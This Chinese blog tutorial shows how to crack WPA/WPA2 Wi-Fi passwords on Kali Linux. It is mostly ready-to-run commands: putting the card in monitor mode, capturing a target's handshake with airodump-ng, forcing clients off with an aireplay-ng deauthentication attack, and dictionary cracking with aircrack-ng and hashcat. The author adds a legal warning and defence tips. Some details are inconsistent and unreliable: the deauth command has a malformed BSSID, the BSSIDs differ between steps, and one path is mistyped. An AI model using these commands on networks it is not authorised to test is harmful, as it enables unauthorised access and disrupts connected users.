---
title: "Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)"
categories: [ "安全" ]
tags: [ "wifi安全" ]
draft: false
slug: "Kali Linux使用Aircrack破解wifi密码(wpawpa2)-kalilinux使用aircrack破解wifi密码wpawpa2"
date: "2017-04-08 07:16:20"
---



Kali Linux能做很多事，但是它主要以渗透测试及’破解wifi密码’闻名。

如果你使用Macbook 请看 `使用macbook破解WPA/WPA2 wifi密码`

要求:

  * 安装有Kali Linux的计算机
  * 支持监控模式的网卡，笔记本电脑一般都支持
  * 字典文件
  * 时间和耐心

这种攻击需要字典文件，一个好的字典至关重要。我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz。

使用前先解压：

    # gzip -d /usr/share/wordlists/rockyou.txt.gz
    

* * *

注意：破解其他人的wifi密码是“犯罪”，so，don’t；我使用自己的无线路由器演示。  
知道了攻击方法，你自然就知道怎么防范了。

* * *

## 1）首先断开连接的wifi。

在终端中执行：

    # airmon-ng

![][1] 

上面命令列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。你可以看到我的wlan0支持监控模式。

## 2）开启无线网卡的监控模式

    # airmon-ng start wlan0

![][2]  
执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看。

## 3）查看wifi网络

    # airodump-ng wlan0mon

上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等。要记住要破解wifi的频道号和BSSID。

按Ctrl-C结束。

## 4）抓取握手包

使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。

开始抓包：

    # airodump-ng -c 6 --bssid BC:46:99:66:F9:84  -w ~/ wlan0mon

参数解释：

  * -c指定频道号
  * –bssid指定路由器bssid
  * -w指定抓取的数据包保存位置

![][3] 

## 5）强制连接到wifi的设备重新连接路由器

现在我们只要等用户连接/重连接wifi了，运气不好也许要很长时间。

但是我们是不会等的，这不是耐心黑客该干的事。有一个叫aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。

aireplay-ng的生效前提是，wifi网络中至少有一个连接的设备。从上图(4)可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址，记住一个。

  * [aircrack-ng官网][4]

打开新终端执行：

    aireplay-ng -0 2 -a 46:99:66:F9:84 -c B8:E8:56:09:CC:9C wlan0mon

参数解释：

  * -0表示发起deauthentication攻击
  * -a指定无线路由器BSSID
  * -c指定强制断开的设备

![][5] 

如果成功：

![][6] 

按Ctrl-C结束抓包。

我们已经得到了想要的握手包了，可以结束无线网卡的监控模式了：

    # airmon-ng stop wlan0mon

![][7] 

## 6) 开始破解密码

    # aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap
    

参数解释：

  * -a2代表WPA的握手包
  * -b指定要破解的wifi BSSID。
  * -w指定字典文件
  * 最后是抓取的包

![][8] 

### 可选）使用显卡的运算能力

如果你有一个强大的GPU，为什么不使用GPU跑字典呢？

[Hashcat][9]可以借助GPU的运算力破解各种不同算法的hash值。

下载时要注意选择正确的显卡类型（AMD、NVidia）。Kali Linux自带这个工具。

在破解cap文件之前，要把它转换为hccap文件：

    # aircrack-ng file.cap -J out.hccap

使用GPU破解hash：

    # hashcat -m 2500 out.hccap 字典文件

## 总结：

  * 防止这种攻击最简单的方法是设置贼复杂贼长的密码；
  * 不要使用WEP加密方式，非常容易被破解
  * 现在的无线路由器都有WPS功能，关了吧

 [1]: /uploads/oss/2017-04-25-14916359902729.png ""
 [2]: /uploads/oss/2017-04-25-14916360322395.png ""
 [3]: /uploads/oss/2017-04-25-14916361897205.png ""
 [4]: https://www.aircrack-ng.org/
 [5]: /uploads/oss/2017-04-25-14916362689961.png ""
 [6]: /uploads/oss/2017-04-25-14916362785725.png ""
 [7]: /uploads/oss/2017-04-25-14916363050642.png ""
 [8]: /uploads/oss/2017-04-25-14916363505198.png ""
 [9]: http://hashcat.net/